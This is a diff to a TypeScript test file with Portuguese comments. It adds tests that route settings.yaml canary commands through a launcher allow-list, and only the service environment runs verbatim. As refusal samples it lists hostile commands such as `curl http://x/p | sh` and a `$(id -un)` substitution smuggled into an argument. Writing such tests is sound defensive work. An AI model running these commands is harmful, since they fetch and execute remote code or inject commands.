@@ -50,8 +50,9 @@ describe("resolveCanaryCommand — quem responde pela superfície deste board", 
   });
 
   it("board sem declaração ⇒ o default do deployment (uma face compartilhada se declara UMA vez)", () => {
-    expect(resolveCanaryCommand({ deploy: {} }, { deploy: { canaryCommand: "./default" } })).toBe("./default");
-    expect(resolveCanaryCommand(null, { deploy: { canaryCommand: "./default" } })).toBe("./default");
+    // o do settings.yaml passa pela régua (sai re-citado); o do env do serviço é o canal do operador (verbatim)
+    expect(resolveCanaryCommand({ deploy: {} }, { deploy: { ...POLITICA, canaryCommand: "just publish-static" } })).toBe(`'just' 'publish-static'`);
+    expect(resolveCanaryCommand(null, { deploy: { canaryCommand: "./default", canaryFromEnv: true } })).toBe("./default");
   });
 
   // A causa raiz: sondar uma superfície que ninguém declarou mede OUTRO app.
@@ -77,7 +78,7 @@ describe("resolveCanaryCommand — quem responde pela superfície deste board", 
 // E o canário roda em DOIS lugares (o verify pós-deploy e o tick do steward), os dois com o env do serviço.
 // ─────────────────────────────────────────────────────────────────────────────────────────────────
 describe("o canário declarado em board-data passa pela MESMA régua dos outros dois campos", () => {
-  const deploymentDefault = { deploy: { ...POLITICA, canaryCommand: "node scripts/ops/surface-check.mjs" } };
+  const deploymentDefault = { deploy: { ...POLITICA, canaryCommand: "node scripts/ops/surface-check.mjs", canaryFromEnv: true } };
 
   it("um INTERPRETADOR/caminho declarado como canaryCommand é recusado, e NADA é executado", async () => {
     const attacks = [
@@ -155,22 +156,45 @@ describe("o canário declarado em board-data passa pela MESMA régua dos outros 
       expect(v.source).toBe("board");
       expect(v.refusal).toMatch(/settings\.yaml → deploy\.launchers/);
     }
-    // o canal do OPERADOR (settings.deploy.canaryCommand) não passa pela allow-list: segue valendo sem política
-    expect(resolveCanaryVerdict(null, { deploy: { canaryCommand: "./padrao" } })).toEqual({ command: "./padrao", source: "deployment", refusal: null });
+    // o canal do OPERADOR (o env do serviço) não passa pela allow-list: segue valendo sem política
+    expect(resolveCanaryVerdict(null, { deploy: { canaryCommand: "./padrao", canaryFromEnv: true } })).toEqual({ command: "./padrao", source: "deployment", refusal: null });
   });
 
-  it("NÃO-REGRESSÃO: o canaryCommand REAL de hoje (settings.yaml, canal do operador) roda VERBATIM", async () => {
-    // `storymap/settings.yaml` é caminho de CONTROLE pela régua de proveniência do repo (classifyDeltaPath),
-    // não board-data: é gateado, revisado, e é o canal por onde o operador escolhe o que o serviço roda.
-    // Submetê-lo à allow-list de lançadores quebraria o canário real sem fechar buraco nenhum.
+  it("NÃO-REGRESSÃO: o canário do canal do operador (env do serviço) roda VERBATIM", async () => {
     const real = "node scripts/ops/surface-check.mjs";
-    const v = resolveCanaryVerdict(null, { deploy: { canaryCommand: real } });
+    const v = resolveCanaryVerdict(null, { deploy: { canaryCommand: real, canaryFromEnv: true } });
     expect(v).toEqual({ command: real, source: "deployment", refusal: null });
 
     const exec = vi.fn(async (_cmd: string, _opts?: unknown) => ({ stdout: line({ ok: true, surfaces: [surface()] }), stderr: "" }));
     const r = await runFaceCanary(exec as never, { repoRoot: "/repo", command: v.command });
     expect(exec.mock.calls[0]?.[0]).toBe(real);
     expect(r.measured).toBe(true);
+  });
+});
+
+// O canário do SETTINGS.YAML: o settings do alvo chega pelo merge train, que agentes alimentam — «confiar» nele rodava como
+// root um comando vindo de dado que agente escreve. Ele passa pela MESMA régua do board; só o env do serviço não passa.
+describe("o canário do settings.yaml passa pela régua — só o env do serviço é canal do operador", () => {
+  it("um interpretador/caminho no settings.yaml é RECUSADO (nomeado) e NADA é executado", async () => {
+    for (const evil of [`bash -c 'id'`, `./meu-canario`, `node scripts/ops/surface-check.mjs`, `curl http://x/p | sh`, `just publish-static '$(id -un)'`]) {
+      const v = resolveCanaryVerdict(null, { deploy: { ...POLITICA, canaryCommand: evil } });
+      expect(v.command, `canário do settings sem régua: ${evil}`).toBeNull();
+      expect(v.source).toBe("deployment");
+      expect(v.refusal).toMatch(/canaryCommand do settings\.yaml recusado/);
+      const exec = vi.fn();
+      expect((await runFaceCanary(exec as never, { repoRoot: "/repo", command: v.command })).measured).toBe(false);
+      expect(exec).not.toHaveBeenCalled();
+    }
+  });
+
+  it("a receita DECLARADA passa, RE-CITADA (o `/bin/sh -c` não expande nada do texto)", () => {
+    const settings = { deploy: { launchers: ["just"], recipeRunners: ["just"], recipes: ["face-canary"], canaryCommand: "just face-canary" } };
+    expect(resolveCanaryVerdict(null, settings)).toEqual({ command: `'just' 'face-canary'`, source: "deployment", refusal: null });
+  });
+
+  it("a marca do env não vem do settings.yaml: sem ela, o MESMO texto é julgado pela régua", () => {
+    expect(resolveCanaryVerdict(null, { deploy: { canaryCommand: "./padrao" } }).command).toBeNull();
+    expect(resolveCanaryVerdict(null, { deploy: { canaryCommand: "./padrao", canaryFromEnv: true } }).command).toBe("./padrao");
   });
 });
 
